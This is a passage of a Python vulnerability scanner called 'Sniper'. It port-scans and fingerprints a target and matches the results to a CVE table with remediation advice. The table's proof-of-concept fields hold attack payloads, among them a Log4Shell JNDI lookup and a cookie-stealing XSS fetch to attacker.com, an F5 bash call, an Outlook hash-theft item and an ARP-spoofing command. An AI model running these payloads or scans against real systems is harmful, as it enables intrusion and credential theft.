#!/usr/bin/env python3
"""
Sniper — Automated Vulnerability Exploitation Backend
Pure Python stdlib only — no pip required

Port: 8769
Endpoints:
  GET /health
  GET /scan?target=<url>&mode=remote|client|both&intensity=1|2|3
"""

import json, socket, ssl, urllib.request, urllib.error
import concurrent.futures, time, re, hashlib, datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import os
PORT = int(os.environ.get("PORT", 8769))
REQUEST_TIMEOUT = 8
PORT_TIMEOUT    = 1.2
MAX_WORKERS     = 40
UA              = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

# ═══════════════════════════════════════════════════════════════════════════════
# CVE DATABASE
# ═══════════════════════════════════════════════════════════════════════════════
CVE_DB = [
    # ── CVSS 10.0 ──────────────────────────────────────────────────────────────
    {
        "cve": "CVE-2021-44228", "name": "Log4Shell",
        "cvss": 10.0, "severity": "critical",
        "year": 2021, "exploit_type": "remote_code_execution",
        "tech_match": ["java","tomcat","spring","elasticsearch","log4j","apache","vmware","logstash"],
        "header_match": ["x-powered-by:java","server:tomcat","server:apache","server:jetty"],
        "body_match": ["log4j","spring boot","elasticsearch","logstash"],
        "description": "JNDI lookup injection via user-controlled input processed by Log4j 2.0–2.14.1. Any logged string containing ${jndi:...} triggers outbound DNS/LDAP lookup and arbitrary class loading.",
        "impact": "Unauthenticated RCE as the JVM service account. Complete application server compromise — data theft, ransomware deployment, lateral movement to internal network.",
        "remediation": "Upgrade Log4j to ≥2.17.1. Set JVM flag -Dlog4j2.formatMsgNoLookups=true as interim. Remove JndiLookup class: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class",
        "poc": "${jndi:ldap://attacker.com:1389/exploit}",
        "cwe": "CWE-917", "mitre": "T1190", "patch_url": "https://logging.apache.org/log4j/2.x/security.html",
        "in_wild": True, "ransomware_linked": True,
    },
    {
        "cve": "CVE-2024-3400", "name": "PAN-OS GlobalProtect Cmd Injection",
        "cvss": 10.0, "severity": "critical",
        "year": 2024, "exploit_type": "remote_code_execution",
        "tech_match": ["panos","pan-os","globalprotect","paloalto","palo alto"],
        "header_match": ["server:pan","x-pan"],
        "body_match": ["globalprotect","pan-os","palo alto networks"],
        "description": "Command injection in PAN-OS GlobalProtect Gateway. Crafted session cookie value executes arbitrary OS commands as root. Zero-day exploited by UTA0218 threat actor.",
        "impact": "Root-level OS command execution on the perimeter firewall. Full network segmentation bypass, credential harvesting from connected VPN clients, APT persistence.",
        "remediation": "Upgrade to PAN-OS 10.2.9-h1, 11.0.4-h1, or 11.1.2-h3. Disable GlobalProtect telemetry as temporary mitigation. Check for /var/log/pan/sslvpn-access.log anomalies.",
        "poc": "GET /ssl-vpn/hipreport.esp\nCookie: SESSID=/../../../var/appweb/sslvpndocs/global-protect/portal/css/shell.txt",
        "cwe": "CWE-78", "mitre": "T1190", "patch_url": "https://security.paloaltonetworks.com/CVE-2024-3400",
        "in_wild": True, "ransomware_linked": False,
    },
    # ── CVSS 9.8 ───────────────────────────────────────────────────────────────
    {
        "cve": "CVE-2021-26084", "name": "Confluence Server OGNL Injection",
        "cvss": 9.8, "severity": "critical",
        "year": 2021, "exploit_type": "remote_code_execution",
        "tech_match": ["confluence","atlassian"],
        "header_match": ["x-confluence-request-time","x-arequestid","set-cookie:confluence"],
        "body_match": ["confluence","atlassian","wiki"],
        "description": "OGNL expression injection in Confluence Server/Data Center via the WebWork framework. Pre-auth exploitation through the /pages/doenterpagewithconflictsorobsolete.action endpoint.",
        "impact": "Arbitrary OS command execution as the confluence service user. Exposed knowledge bases, credential extraction from confluence config, pivot to internal Jira/Bitbucket.",
        "remediation": "Upgrade to Confluence 7.4.17, 7.13.7, 7.14.3, 7.15.2, 7.16.4, 7.17.4 or 7.18.1+. Disable public signup. Restrict internet exposure of Confluence.",
        "poc": "POST /pages/doenterpagewithconflictsorobsolete.action\nbodyParameter=%25%7B(%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22id%22))%7D",
        "cwe": "CWE-74", "mitre": "T1190", "patch_url": "https://confluence.atlassian.com/doc/confluence-security-advisory-2021-08-25-1077906215.html",
        "in_wild": True, "ransomware_linked": True,
    },
    {
        "cve": "CVE-2022-22965", "name": "Spring4Shell — Spring MVC RCE",
        "cvss": 9.8, "severity": "critical",
        "year": 2022, "exploit_type": "remote_code_execution",
        "tech_match": ["spring","springframework","java","tomcat"],
        "header_match": ["x-application-context","server:tomcat","x-powered-by:spring"],
        "body_match": ["spring","whitelabel error","springframework"],
        "description": "ClassLoader manipulation via Spring MVC data binding allows writing arbitrary files to webroot. Requires JDK 9+ and Spring Framework 5.2.x/5.3.x deployed as WAR on Tomcat.",
        "impact": "Web shell (.jsp) written to Tomcat webroot — persistent RCE. Application secrets, database credentials, and all managed data exposed.",
        "remediation": "Upgrade Spring Framework to 5.3.18+ or 5.2.20+. Use Spring Boot 2.6.6+. As workaround, use DataBinder.setDisallowedFields to block 'class.**', 'Class.**', 'classLoader.**'.",
        "poc": "GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B...",
        "cwe": "CWE-94", "mitre": "T1190", "patch_url": "https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement",
        "in_wild": True, "ransomware_linked": False,
    },
    {
        "cve": "CVE-2022-1388", "name": "F5 BIG-IP iControl REST Auth Bypass",
        "cvss": 9.8, "severity": "critical",
        "year": 2022, "exploit_type": "authentication_bypass",
        "tech_match": ["big-ip","f5","bigip","tmui","icontrol"],
        "header_match": ["server:big-ip","x-f5","set-cookie:bigipserver","set-cookie:f5_sso"],
        "body_match": ["big-ip","f5 networks","tmui","icontrol"],
        "description": "Authentication bypass in iControl REST API via forged Connection header. Allows unauthenticated access to all management API endpoints as admin.",
        "impact": "Full BIG-IP management access — modify load balancer rules, extract VPN credentials, deploy backdoor iRule. Affects all traffic passing through the appliance.",
        "remediation": "Apply K23605346 hotfix. Block /mgmt/ endpoint externally. Disable iControl REST if unused. Upgrade to 17.0.0, 16.1.2.2, 15.1.5.1, 14.1.4.6, or 13.1.5.",
        "poc": "POST /mgmt/tm/util/bash HTTP/1.1\nHost: target\nAuthorization: Basic YWRtaW46\nX-F5-Auth-Token: \nConnection: keep-alive, X-F5-Auth-Token\n\n{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}",
        "cwe": "CWE-306", "mitre": "T1190", "patch_url": "https://support.f5.com/csp/article/K23605346",
        "in_wild": True, "ransomware_linked": True,
    },
    {
        "cve": "CVE-2023-23397", "name": "Microsoft Outlook NTLM Hash Theft",
        "cvss": 9.8, "severity": "critical",
        "year": 2023, "exploit_type": "credential_theft",
        "tech_match": ["outlook","exchange","microsoft","owa","office365"],
        "header_match": ["x-owa-version","x-ms-diagnostics","x-powered-by:asp.net","server:microsoft"],
        "body_match": ["outlook","exchange","office 365","microsoft 365","owa"],
        "description": "Zero-click NTLM credential theft via specially crafted Outlook meeting request. The UNC path in REMINDER property triggers automatic NTLM authentication to attacker SMB server with no user interaction.",
        "impact": "Net-NTLMv2 hash capture. Hash relayed for lateral movement (NTLM relay) or cracked offline (hashcat/john). No user click required — email receipt is sufficient.",
        "remediation": "Apply MS Patch Tuesday March 2023. Block TCP 445/135/139 outbound at perimeter firewall. Add Protected Users security group for privileged accounts. Enable EPA for Exchange.",
        "poc": "BEGIN:VCALENDAR\nBEGIN:VEVENT\nBEGIN:VALARM\nACTION:DISPLAY\nTRIGGER:-PT0S\nATTACH;ENCODING=BASE64;VALUE=BINARY:\\\\\\\\attacker-ip\\\\share\\\\pwn\nEND:VALARM\nEND:VEVENT\nEND:VCALENDAR",
        "cwe": "CWE-522", "mitre": "T1187", "patch_url": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-23397",
        "in_wild": True, "ransomware_linked": False,
    },
    {
        "cve": "CVE-2023-34362", "name": "MOVEit Transfer Critical SQLi",
        "cvss": 9.8, "severity": "critical",
        "year": 2023, "exploit_type": "sql_injection",
        "tech_match": ["moveit","ipswitch","progress"],
        "header_match": ["set-cookie:movenitsessionid","server:moveit","x-powered-by:asp.net"],
        "body_match": ["moveit","ipswitch","human.aspx","guestaccess.aspx"],
        "description": "SQL injection in MOVEit Transfer web application (pre-auth). Attackers can submit crafted payloads to guestaccess.aspx, exploiting the database to install a CLSID-based backdoor and exfiltrate data.",
        "impact": "Full database exfiltration, backdoor (.aspx webshell) installation, file theft. Exploited at scale by Cl0p ransomware group affecting 2,700+ organisations.",
        "remediation": "Apply Critical Security Patch (May 31, 2023). Disable all HTTP/HTTPS traffic to MOVEit Transfer immediately if unpatched. Audit azurefile storage for unauthorized access.",
        "poc": "POST /guestaccess.aspx\nContent-Type: application/x-www-form-urlencoded\n\nLoginPassword=x';DECLARE @x AS NVARCHAR(4000);SET @x=...;EXEC(@x)--",
        "cwe": "CWE-89", "mitre": "T1190", "patch_url": "https://community.progress.com/s/article/MOVEit-Transfer-Critical-Vulnerability-31May2023",
        "in_wild": True, "ransomware_linked": True,
    },
    {
        "cve": "CVE-2022-47966", "name": "Zoho ManageEngine Pre-Auth RCE",
        "cvss": 9.8, "severity": "critical",
        "year": 2023, "exploit_type": "remote_code_execution",
        "tech_match": ["manageengine","zoho","servicedesk","admanager","adselfservice","opmanager"],
        "header_match": ["server:manageengine","x-powered-by:zoho","set-cookie:admpSession"],
        "body_match": ["manageengine","zoho","servicedesk plus","admanager"],
        "description": "XML signature validation bypass in Apache Santuario used by ManageEngine SAML SSO. Attackers craft a SAML response to execute arbitrary Java code without any account.",
        "impact": "Pre-auth RCE as SYSTEM/root. Complete server compromise, Active Directory enumeration, credential extraction, ransomware staging. Exploited by suspected Iranian state actors.",
        "remediation": "Upgrade to the latest ManageEngine build (post-Oct 2022). Disable SAML SSO if not required. Check for new admin accounts or scheduled tasks.",
        "poc": "POST /samlLogin\nContent-Type: application/x-www-form-urlencoded\n\nSAMLResponse=<crafted_xml_with_injected_xslt>",
        "cwe": "CWE-347", "mitre": "T1190", "patch_url": "https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html",
        "in_wild": True, "ransomware_linked": True,
    },
    {
        "cve": "CVE-2021-21985", "name": "VMware vCenter Server RCE",
        "cvss": 9.8, "severity": "critical",
        "year": 2021, "exploit_type": "remote_code_execution",
        "tech_match": ["vcenter","vmware","vsphere","esxi"],
        "header_match": ["server:vmware","x-content-type-options:nosniff"],
        "body_match": ["vcenter","vmware","vsphere","esxi","vsphere client"],
        "description": "RCE via Virtual SAN Health Check plugin enabled by default in vSphere Client. Unauthenticated attacker sends HTTP request to /ui/h5-vsan endpoint triggering arbitrary Java method invocation.",
        "impact": "Full vCenter Server compromise — control all ESXi hosts, VMs, and storage. Lateral movement to entire virtual infrastructure. Ransomware can encrypt all VM datastores.",
        "remediation": "Apply VMSA-2021-0010. If patching is delayed, disable the Virtual SAN Health Check, Site Recovery, vSphere Lifecycle Manager, VMware Cloud Director Availability plugins.",
        "poc": "POST /ui/h5-vsan/rest/proxy/service/&vsanProviderUtils_setConfig\nContent-Type: application/json\n\n{\"methodInput\":[{\"moid\":\"ha:...\",\"methodName\":\"setConfig\"}]}",
        "cwe": "CWE-20", "mitre": "T1190", "patch_url": "https://www.vmware.com/security/advisories/VMSA-2021-0010.html",
        "in_wild": True, "ransomware_linked": True,
    },
    # ── CVSS 7.x ──────────────────────────────────────────────────────────────
    {
        "cve": "CVE-2023-44487", "name": "HTTP/2 Rapid Reset DDoS",
        "cvss": 7.5, "severity": "high",
        "year": 2023, "exploit_type": "denial_of_service",
        "tech_match": ["nginx","apache","h2","http/2","cloudflare","aws","caddy","lighttpd"],
        "header_match": ["server:nginx","server:apache","server:cloudflare","server:caddy"],
        "body_match": [],
        "description": "Weaponisation of HTTP/2 stream multiplexing. Attacker opens streams and immediately sends RST_STREAM, forcing server to handle unlimited concurrent requests with minimal client effort.",
        "impact": "Application layer DDoS capable of taking down servers with far fewer clients than traditional floods. Google, Cloudflare and AWS all recorded record DDoS attacks using this technique.",
        "remediation": "Update nginx to 1.25.3+, Apache httpd to 2.4.58+. Configure http2_max_concurrent_streams limit. Enable rate limiting at CDN/WAF layer. Cloudflare/AWS Shield mitigate automatically.",
        "poc": "Rapid RST_STREAM frames on HTTP/2 multiplexed connections — 20,000 rps from single host",
        "cwe": "CWE-400", "mitre": "T1498.002", "patch_url": "https://nginx.org/en/CHANGES",
        "in_wild": True, "ransomware_linked": False,
    },
    {
        "cve": "CVE-2021-3156", "name": "Sudo Baron Samedit Heap Overflow",
        "cvss": 7.8, "severity": "high",
        "year": 2021, "exploit_type": "privilege_escalation",
        "tech_match": ["ubuntu","debian","centos","rhel","linux","fedora"],
        "header_match": ["server:ubuntu","server:debian","server:centos","server:apache/2","server:nginx/1"],
        "body_match": ["ubuntu","debian","centos","rhel","linux"],
        "description": "Heap buffer overflow in sudoedit (sudo ≤1.9.5p1). The -s flag combined with a backslash-terminated argument bypasses argument escaping and overflows the heap, allowing root privilege escalation.",
        "impact": "Any local user gains root. Post-initial-access: escalates low-privilege shell to full root on almost all Linux distributions. Affects sudo 1.8.2–1.8.31p2 and 1.9.0–1.9.5p1.",
        "remediation": "Upgrade sudo to ≥1.9.5p2 immediately. Verify: sudo --version. Apply vendor patches: apt update && apt upgrade sudo / yum update sudo.",
        "poc": "sudoedit -s '\\\\' $(python3 -c 'print(\"A\"*65536)')\n[exploits heap with customised payload to overwrite service_user struct]",
        "cwe": "CWE-122", "mitre": "T1068", "patch_url": "https://www.sudo.ws/security/advisories/sudo_baron_samedit/",
        "in_wild": False, "ransomware_linked": False,
    },
    # ── Client-side / Misconfiguration ─────────────────────────────────────────
    {
        "cve": "MISC-XSS-001", "name": "Reflected XSS — No CSP",
        "cvss": 6.1, "severity": "medium",
        "year": 2023, "exploit_type": "cross_site_scripting",
        "tech_match": ["*"],
        "header_match": [],
        "body_match": [],
        "_trigger": "missing_csp",
        "description": "Content-Security-Policy header absent. Allows reflected/stored XSS payloads to execute in victim browsers without script-src restrictions blocking injected scripts.",
        "impact": "Session cookie theft, credential harvesting via overlay forms, keyloggers, malicious redirects to phishing pages. Full account takeover without authentication.",
        "remediation": "Implement strict CSP: Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'. Use Trusted Types API. Encode all user-controlled output (OWASP XSS Prevention Cheat Sheet).",
        "poc": "<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>\n<!-- Or as URL param: https://target.com/search?q=<img src=x onerror=alert(document.domain)> -->",
        "cwe": "CWE-79", "mitre": "T1059.007", "patch_url": "https://owasp.org/www-community/attacks/xss/",
        "in_wild": True, "ransomware_linked": False,
    },
    {
        "cve": "MISC-CLICK-001", "name": "Clickjacking — No X-Frame-Options",
        "cvss": 6.1, "severity": "medium",
        "year": 2023, "exploit_type": "clickjacking",
        "tech_match": ["*"],
        "header_match": [],
        "body_match": [],
        "_trigger": "missing_xframe",
        "description": "X-Frame-Options and CSP frame-ancestors both absent. Page can be embedded in attacker-controlled iframe, overlaying transparent UI elements to hijack user clicks.",
        "impact": "Victims tricked into clicking invisible buttons — triggering fund transfers, account setting changes, OAuth grants, or CSRF-amplified actions.",
        "remediation": "Add header: X-Frame-Options: DENY\nOr CSP: Content-Security-Policy: frame-ancestors 'none'\nBoth for defence-in-depth.",
        "poc": "<html><body style='margin:0'>\n  <div style='opacity:0;position:absolute;z-index:9;top:0;left:0;width:100%;height:100%'>\n    <button style='width:120px;height:40px;position:absolute;top:200px;left:300px'>HIDDEN</button>\n  </div>\n  <iframe src='https://TARGET/account/delete' style='width:100%;height:100vh;border:0'></iframe>\n</body></html>",
        "cwe": "CWE-1021", "mitre": "T1185", "patch_url": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options",
        "in_wild": True, "ransomware_linked": False,
    },
    {
        "cve": "MISC-CSRF-001", "name": "CSRF — Missing SameSite Cookie",
        "cvss": 5.4, "severity": "medium",
        "year": 2023, "exploit_type": "csrf",
        "tech_match": ["*"],
        "header_match": [],
        "body_match": [],
        "_trigger": "missing_samesite",
        "description": "Session or auth cookies set without SameSite=Lax/Strict attribute. Cookies are sent on cross-origin requests, enabling cross-site request forgery attacks against authenticated users.",
        "impact": "Attacker-controlled page submits authenticated requests as the victim — password change, email change, payment initiation, admin action execution.",
        "remediation": "Set SameSite=Strict on session cookies (or Lax if cross-site navigation needed). Add CSRF tokens to all state-changing forms. Use custom request headers (X-Requested-With) for APIs.",
        "poc": "<!-- Hosted on attacker.com -->\n<form method='POST' action='https://TARGET/account/change-email'>\n  <input name='email' value='attacker@evil.com'>\n</form>\n<script>document.forms[0].submit()</script>",
        "cwe": "CWE-352", "mitre": "T1185", "patch_url": "https://owasp.org/www-community/attacks/csrf",
        "in_wild": True, "ransomware_linked": False,
    },
    {
        "cve": "MISC-HSTS-001", "name": "Missing HSTS — SSL Stripping Attack",
        "cvss": 4.8, "severity": "low",
        "year": 2023, "exploit_type": "downgrade_attack",
        "tech_match": ["*"],
        "header_match": [],
        "body_match": [],
        "_trigger": "missing_hsts",
        "description": "Strict-Transport-Security (HSTS) header absent. Browser will accept plain HTTP connections, allowing network-positioned attacker to perform SSL stripping and intercept credentials.",
        "impact": "Man-in-the-middle attack on HTTP — full plaintext credential capture, session token theft, content injection on any network path between client and server.",
        "remediation": "Add: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload\nSubmit to HSTS Preload List at hstspreload.org. Redirect all HTTP to HTTPS.",
        "poc": "# sslstrip / bettercap on same network segment:\nbettercap -iface eth0 -eval \"net.probe on; arp.spoof on; hstshijack/hstshijack on\"",
        "cwe": "CWE-319", "mitre": "T1557.002", "patch_url": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security",
        "in_wild": False, "ransomware_linked": False,
    },
    {
        "cve": "MISC-INFO-001", "name": "Server Banner Information Disclosure",
        "cvss": 5.3, "severity": "medium",
        "year": 2023, "exploit_type": "information_disclosure",
        "tech_match": ["*"],
        "header_match": [],
        "body_match": [],
        "_trigger": "verbose_server_headers",
        "description": "Server and/or X-Powered-By headers reveal exact software name and version. Enables attackers to precisely identify known CVEs for the running software version without any probing.",
        "impact": "Eliminates guesswork for attackers — allows instant mapping of exact CVEs. Accelerates exploitation from days to minutes by revealing precise version fingerprint.",
        "remediation": "Nginx: server_tokens off;\nApache: ServerTokens Prod; ServerSignature Off;\nIIS: Remove-WebConfigurationProperty -pspath 'MACHINE/WEBROOT/APPHOST' -filter 'system.webServer/security/requestFiltering' -name 'removeServerHeader'\nPHP: expose_php = Off",
        "poc": "curl -I https://TARGET\n\nServer: Apache/2.4.49 (Ubuntu)\nX-Powered-By: PHP/7.4.3\n# → CVE-2021-41773 (Apache 2.4.49 path traversal) immediately applicable",
        "cwe": "CWE-200", "mitre": "T1592.002", "patch_url": "https://owasp.org/www-project-secure-headers/",
        "in_wild": True, "ransomware_linked": False,
    },
]

# ═══════════════════════════════════════════════════════════════════════════════
# PORT DATABASE
# ═══════════════════════════════════════════════════════════════════════════════
PORTS = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 465, 587, 993, 995,
         1433, 1521, 2375, 2376, 3306, 3389, 4848, 5432, 5900, 5985, 6379,
         7001, 8080, 8443, 8888, 9200, 9300, 11211, 27017, 50070]

PORT_META = {
    21:    ("FTP",           "high",   "Cleartext file transfer — credential sniffing, anonymous access"),
    22:    ("SSH",           "medium", "Secure Shell — brute-force, weak key exploitation"),
    23:    ("Telnet",        "critical","Cleartext remote access — trivial credential capture"),
    25:    ("SMTP",          "medium", "Mail relay — open relay abuse, envelope spoofing"),
    53:    ("DNS",           "medium", "DNS service — zone transfer, cache poisoning"),
    80:    ("HTTP",          "medium", "Unencrypted web — traffic interception, credential theft"),
    110:   ("POP3",          "high",   "Cleartext email retrieval — credential sniffing"),
    143:   ("IMAP",          "high",   "Cleartext email access — credential sniffing"),
    443:   ("HTTPS",         "low",    "Encrypted web — check TLS version and certificate"),
    445:   ("SMB",           "critical","Windows file sharing — EternalBlue, ransomware propagation"),
    465:   ("SMTPS",         "low",    "Encrypted mail submission"),
    587:   ("SMTP Submission","low",   "Authenticated mail submission"),
    993:   ("IMAPS",         "low",    "Encrypted email access"),
    995:   ("POP3S",         "low",    "Encrypted email retrieval"),
    1433:  ("MSSQL",         "critical","SQL Server exposed — direct DB access, xp_cmdshell RCE"),
    1521:  ("Oracle DB",     "critical","Oracle exposed — direct DB access, TNS listener attacks"),
    2375:  ("Docker API",    "critical","Unauthenticated Docker socket — container escape, host RCE"),
    2376:  ("Docker TLS",    "high",   "Docker API with TLS — verify cert auth is enforced"),
    3306:  ("MySQL",         "critical","Database exposed — direct query, credential brute-force"),
    3389:  ("RDP",           "high",   "Remote Desktop — BlueKeep, DejaBlue, brute-force target"),
    4848:  ("GlassFish",     "critical","Java EE admin — default creds, WAR deployment RCE"),
    5432:  ("PostgreSQL",    "critical","Database exposed — direct query, COPY TO/FROM RCE"),
    5900:  ("VNC",           "critical","Remote desktop — often unauthenticated, screen capture"),
    5985:  ("WinRM",         "high",   "Windows Remote Management — lateral movement target"),
    6379:  ("Redis",         "critical","In-memory DB — usually no auth, config-write RCE"),
    7001:  ("WebLogic",      "critical","Oracle WebLogic — T3 deserialization RCE (CVE-2020-14882)"),
    8080:  ("HTTP-Alt",      "medium", "Dev/staging web — often unprotected, verbose errors"),
    8443:  ("HTTPS-Alt",     "medium", "Alternate HTTPS — management interface exposure"),
    8888:  ("Jupyter",       "critical","Jupyter notebook — unauthenticated code execution"),
    9200:  ("Elasticsearch", "critical","Search engine — no auth by default, full data access"),
    9300:  ("ES Transport",  "critical","Elasticsearch cluster — direct data node access"),
    11211: ("Memcached",     "high",   "Cache server — data extraction, UDP amplification DDoS"),
    27017: ("MongoDB",       "critical","NoSQL DB — no auth by default, full collection access"),
    50070: ("Hadoop HDFS",   "critical","Hadoop NameNode — unauthenticated data access"),
}

RISK_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3}

# ═══════════════════════════════════════════════════════════════════════════════
# HTTP / NETWORK HELPERS
# ═══════════════════════════════════════════════════════════════════════════════

def mk_ssl_ctx():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx

def fetch(url: str, timeout: int = REQUEST_TIMEOUT) -> "tuple[int, dict, str]":
    """GET → (status, headers_lower, body[:16k])"""
    try:
        req = urllib.request.Request(url, headers={"User-Agent": UA, "Accept": "*/*"})
        with urllib.request.urlopen(req, timeout=timeout, context=mk_ssl_ctx()) as r:
            hdrs = {k.lower(): v for k, v in r.headers.items()}
            body = r.read(16384).decode("utf-8", errors="replace")
            return r.status, hdrs, body
    except urllib.error.HTTPError as e:
        try:
            hdrs = {k.lower(): v for k, v in e.headers.items()}
            body = e.read(4096).decode("utf-8", errors="replace")
        except Exception:
            hdrs, body = {}, ""
        return e.code, hdrs, body
    except Exception:
        return 0, {}, ""

def probe_port(host: str, port: int) -> "tuple[bool, str]":
    """Returns (open, banner_snippet)"""
    try:
        s = socket.socket()
        s.settimeout(PORT_TIMEOUT)
        s.connect((host, port))
        banner = ""
        try:
            if port in (80, 8080, 8888):
                s.sendall(b"HEAD / HTTP/1.0\r\nHost: " + host.encode() + b"\r\n\r\n")
            elif port == 21:
                pass  # FTP sends banner automatically
            elif port == 22:
                pass  # SSH sends banner automatically
            data = s.recv(512)
            banner = data.decode("utf-8", errors="replace").split("\n")[0].strip()[:100]
        except Exception:
            pass
        s.close()
        return True, banner
    except Exception:
        return False, ""

def tls_info(hostname: str, port: int = 443) -> dict:
    """Grab TLS certificate and negotiated version."""
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with socket.create_connection((hostname, port), timeout=6) as raw:
            with ctx.wrap_socket(raw, server_hostname=hostname) as s:
                cert  = s.getpeercert()
                ver   = s.version()
                ciph  = s.cipher()
                return {
                    "version":     ver or "Unknown",
                    "cipher":      ciph[0] if ciph else "Unknown",
                    "subject":     dict(x[0] for x in cert.get("subject", [])),
                    "issuer":      dict(x[0] for x in cert.get("issuer", [])),
                    "not_before":  cert.get("notBefore", ""),
                    "not_after":   cert.get("notAfter", ""),
                    "sans":        [v for _, v in cert.get("subjectAltName", [])],
                    "weak_tls":    ver in ("TLSv1", "TLSv1.1", "SSLv3"),
                    "error":       None,
                }
    except Exception as e:
        return {"error": str(e), "weak_tls": False}

# ═══════════════════════════════════════════════════════════════════════════════
# TECH STACK DETECTION
# ═══════════════════════════════════════════════════════════════════════════════
TECH_SIGS = {
    "WordPress":    (["wp-content","wp-includes","wordpress"], ["x-powered-by:wordpress"]),
    "Drupal":       (["drupal","sites/default","drupal.js"], ["x-generator:drupal","x-drupal"]),
    "Joomla":       (["/components/com_","joomla"], []),
    "Laravel":      (["laravel_session","laravel","illuminate"], ["x-powered-by:php"]),
    "Django":       (["csrfmiddlewaretoken","django"], ["server:wsgiserver","x-frame-options:sameorigin"]),
    "Ruby on Rails":(["rails","authenticity_token","rack"], ["x-powered-by:phusion passenger","server:puma"]),
    "Spring Boot":  (["whitelabel error","spring boot","actuator"], ["x-application-context"]),
    "ASP.NET":      (["__viewstate","asp.net","webresource.axd"], ["x-powered-by:asp.net","x-aspnet-version"]),
    "Express.js":   ([], ["x-powered-by:express"]),
    "Next.js":      (["__next_data__","_next/static"], ["x-powered-by:next.js"]),
    "Apache Tomcat":(["apache tomcat","tomcat","org.apache"], ["server:apache-coyote","server:tomcat"]),
    "Nginx":        ([], ["server:nginx"]),
    "Apache httpd": ([], ["server:apache"]),
    "IIS":          ([], ["server:microsoft-iis","x-aspnet-version"]),
    "Cloudflare":   ([], ["server:cloudflare","cf-ray"]),
    "Elastic":      (["elasticsearch","kibana"], ["x-elastic-product","x-found-handling-cluster"]),
    "Jenkins":      (["jenkins","hudson"], ["x-jenkins","x-hudson"]),
    "GitLab":       (["gitlab"], ["x-gitlab","set-cookie:_gitlab_session"]),
    "Confluence":   (["confluence","atlassian"], ["x-confluence-request-time","x-arequestid"]),
    "Jira":         (["jira","atlassian"], ["x-arequestid","set-cookie:jira.8b"]),
    "PHP":          ([], ["x-powered-by:php"]),
    "Python":       ([], ["server:waitress","server:gunicorn","server:werkzeug","server:uvicorn"]),
}

def detect_tech(headers: dict, body: str) -> list[str]:
    found = []
    hdrs_str = " ".join(f"{k}:{v}" for k, v in headers.items()).lower()
    body_l   = body.lower()
    for tech, (body_sigs, hdr_sigs) in TECH_SIGS.items():
        matched = any(s in body_l for s in body_sigs) or any(s in hdrs_str for s in hdr_sigs)
        if matched:
            found.append(tech)
    return found

# ═══════════════════════════════════════════════════════════════════════════════
# CVE MATCHING
# ═══════════════════════════════════════════════════════════════════════════════

def match_cves(headers: dict, body: str, tech_stack: list[str], open_ports: list[dict]) -> list[dict]:
    hdrs_str = " ".join(f"{k}:{v}" for k, v in headers.items()).lower()
    body_l   = body.lower()
    tech_l   = [t.lower() for t in tech_stack]
    port_svcs = [p["service"].lower() for p in open_ports]
    cookie    = headers.get("set-cookie", "").lower()
    results   = []

    for cve in CVE_DB:
        trigger = cve.get("_trigger")
        score   = 0
        evidence = []

        # ── Special trigger conditions ────────────────────────────────────────
        if trigger == "missing_csp":
            if "content-security-policy" not in headers:
                score += 5
                evidence.append("Content-Security-Policy header is absent")
        elif trigger == "missing_xframe":
            no_xfo = "x-frame-options" not in headers
            no_fa  = "frame-ancestors" not in headers.get("content-security-policy", "")
            if no_xfo and no_fa:
                score += 5
                evidence.append("X-Frame-Options absent and CSP frame-ancestors not set")
        elif trigger == "missing_samesite":
            if cookie and "samesite" not in cookie:
                score += 5
                evidence.append(f"Session cookie missing SameSite: {cookie[:60]}")
        elif trigger == "missing_hsts":
            if "strict-transport-security" not in headers:
                score += 3
                evidence.append("Strict-Transport-Security header absent")
        elif trigger == "verbose_server_headers":
            for h in ["server", "x-powered-by", "x-aspnet-version", "x-aspnetmvc-version"]:
                if h in headers:
                    score += 3
                    evidence.append(f"Verbose header detected: {h}: {headers[h]}")
        else:
            # ── Tech-stack match ──────────────────────────────────────────────
            for kw in cve.get("tech_match", []):
                if kw == "*":
                    continue
                if kw in tech_l:
                    score += 4
                    evidence.append(f"Tech stack match: {kw}")
                    break
            # ── Header match ──────────────────────────────────────────────────
            for sig in cve.get("header_match", []):
                if sig in hdrs_str:
                    score += 3
                    evidence.append(f"Header fingerprint: {sig}")
                    break
            # ── Body match ────────────────────────────────────────────────────
            for kw in cve.get("body_match", []):
                if kw in body_l:
                    score += 2
                    evidence.append(f"Body keyword: '{kw}'")
                    break
            # ── Port service match ────────────────────────────────────────────
            for kw in cve.get("tech_match", []):
                if kw in port_svcs:
                    score += 2
                    evidence.append(f"Open port service: {kw}")
                    break

        if score >= 3:
            conf = "high" if score >= 7 else "medium" if score >= 4 else "low"
            results.append({**cve, "evidence": evidence, "confidence": conf, "match_score": score})

    results.sort(key=lambda x: (-x["cvss"], x["cve"]))
    return results

# ═══════════════════════════════════════════════════════════════════════════════
# HEADER AUDIT
# ═══════════════════════════════════════════════════════════════════════════════
SEC_HEADERS = [
    ("strict-transport-security", "HSTS",                   "Prevents HTTP downgrade / SSL stripping",                "critical"),
    ("content-security-policy",   "Content-Security-Policy","Mitigates XSS and code injection",                       "high"),
    ("x-frame-options",           "X-Frame-Options",        "Prevents clickjacking UI redressing",                    "high"),
    ("x-content-type-options",    "X-Content-Type-Options", "Prevents MIME type sniffing",                            "medium"),
    ("referrer-policy",           "Referrer-Policy",        "Controls referrer info sent to other origins",           "medium"),
